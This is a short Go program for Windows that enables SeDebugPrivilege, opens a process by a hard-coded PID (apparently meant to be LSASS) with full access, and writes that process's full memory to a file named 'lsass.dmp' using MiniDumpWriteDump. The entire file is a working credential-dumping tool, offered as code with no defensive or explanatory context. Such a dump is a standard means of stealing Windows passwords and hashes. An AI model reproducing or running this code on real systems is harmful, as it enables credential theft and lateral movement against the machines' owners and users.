package main

import (
	"fmt"
	"syscall"
	"unsafe"
)
type LUID struct {
	LowPart uint32
	HighPart int32
}
type LUID_AND_ATTRIBUTES struct {
	Luid LUID
	Attributes uint32
}
type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges [1]LUID_AND_ATTRIBUTES
}

var MiniDumpWithFullMemory = 0x00000002
const SE_PRIVILEGE_ENABLED = 0x00000002
var Kernel32 = syscall.NewLazyDLL("Kernel32.dll")
var Apdvapi32 = syscall.NewLazyDLL("Advapi32.dll")
var Dbghelp = syscall.NewLazyDLL("Dbghelp.dll")

var HandleToken syscall.Token
var TP TOKEN_PRIVILEGES
var NULL uintptr
var processEntry syscall.ProcessEntry32
var PROCESS_ALL_ACCESS uint32 = 0x1F0FFF

func EnableDebugPrivilege(){
	CurrentHandle,_,_ := Kernel32.NewProc("GetCurrentProcess").Call()
	Kernel32.NewProc("OpenProcessToken").Call(CurrentHandle,syscall.TOKEN_ALL_ACCESS,uintptr(unsafe.Pointer(&HandleToken)))
	TP.PrivilegeCount = 1
	TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	Apdvapi32.NewProc("LookupPrivilegeValueW").Call(NULL,uintptr(unsafe.Pointer(SE_DEBUG_NAME)),uintptr(unsafe.Pointer(&TP.Privileges[0].Luid)))
	Apdvapi32.NewProc("AdjustTokenPrivileges").Call(uintptr(HandleToken),uintptr(0),uintptr(unsafe.Pointer(&TP)),NULL,NULL)
}

func main(){
	var ProcessPID uint32 = 856
	var ProcessHanle syscall.Handle
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))
	Snapshot ,_ := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS,0)
	err := syscall.Process32First(Snapshot,&processEntry)
	if err != nil {
		fmt.Println("[-] syscall.Process32First falied")
	}
	for {
		if processEntry.ProcessID == ProcessPID {
			EnableDebugPrivilege()
			ProcessHanle, _ = syscall.OpenProcess(PROCESS_ALL_ACCESS, false, processEntry.ProcessID)
		}
		err := syscall.Process32Next(Snapshot,&processEntry)
		if err != nil {
			break
		}
	}
	lsassdmp ,_:= syscall.UTF16PtrFromString("lsass.dmp")
	dumpFile,_ := syscall.CreateFile(lsassdmp ,syscall.GENERIC_ALL,0,nil,syscall.CREATE_ALWAYS,syscall.FILE_ATTRIBUTE_NORMAL,0)
	_, _, err = Dbghelp.NewProc("MiniDumpWriteDump").Call(uintptr(ProcessHanle), uintptr(ProcessPID), uintptr(dumpFile), uintptr(MiniDumpWithFullMemory), uintptr(0), uintptr(0), uintptr(0))
	if err != nil{
		fmt.Println(err)
	}else{
		fmt.Println("[+] MiniDump success,file name is lsass.dmp")
	}
}
